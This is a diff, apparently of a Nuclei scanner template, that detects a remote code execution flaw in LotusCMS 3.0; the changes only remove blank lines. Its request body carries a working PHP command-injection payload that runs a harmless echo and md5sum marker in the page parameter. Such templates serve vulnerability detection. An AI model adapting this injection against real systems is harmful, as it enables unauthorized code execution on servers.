@@ -1,5 +1,4 @@
 id: lotuscms-rce
-
 info:
   name: LotusCMS 3.0 - Remote Code Execution
   author: pikpikcu
@@ -13,25 +12,21 @@ info:
     cvss-score: 10.0
     cwe-id: CWE-77
   tags: lotuscms,rce
-
 requests:
   - method: POST
     path:
       - "{{BaseURL}}/index.php"
       - "{{BaseURL}}/lcms/index.php"
-
     headers:
       Content-Type: application/x-www-form-urlencoded
     body: |
       page=index');${system('echo lotuscms_rce | md5sum')};#
-
     matchers-condition: and
     matchers:
       - type: word
         part: body
         words:
           - "38ee63071a04dc5e04ed22624c38e648"
-
       - type: status
         status:
           - 200
